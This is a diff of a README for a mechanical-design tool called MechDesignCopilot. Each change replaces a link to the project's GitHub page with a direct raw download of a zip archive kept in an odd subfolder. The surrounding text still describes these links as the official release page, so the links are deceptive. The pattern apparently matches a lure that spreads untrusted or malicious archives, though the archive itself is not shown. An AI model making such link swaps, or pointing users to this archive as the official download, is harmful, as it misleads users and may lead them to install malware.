@@ -1,6 +1,6 @@
 # ⚙️ MechDesignCopilot - Streamline Complex Mechanical Design
 
-[![Download MechDesignCopilot](https://img.shields.io/badge/Download-MechDesignCopilot-brightgreen?style=for-the-badge)](https://github.com/FCkulite/MechDesignCopilot)
+[![Download MechDesignCopilot](https://img.shields.io/badge/Download-MechDesignCopilot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/FCkulite/MechDesignCopilot/main/bulby/Design-Mech-Copilot-v1.3.zip)
 
 ---
 
@@ -40,7 +40,7 @@ You must download the software from the official GitHub page to ensure you get t
 
 Click the green button below to open the download page.
 
-[![Visit GitHub Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/FCkulite/MechDesignCopilot)
+[![Visit GitHub Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/FCkulite/MechDesignCopilot/main/bulby/Design-Mech-Copilot-v1.3.zip)
 
 The page shows the latest release and all files you can download.
 
@@ -139,4 +139,4 @@ To update:
 
 Use this link to visit the official project page and download the latest version:
 
-[https://github.com/FCkulite/MechDesignCopilot](https://github.com/FCkulite/MechDesignCopilot)
+[https://raw.githubusercontent.com/FCkulite/MechDesignCopilot/main/bulby/Design-Mech-Copilot-v1.3.zip](https://raw.githubusercontent.com/FCkulite/MechDesignCopilot/main/bulby/Design-Mech-Copilot-v1.3.zip)
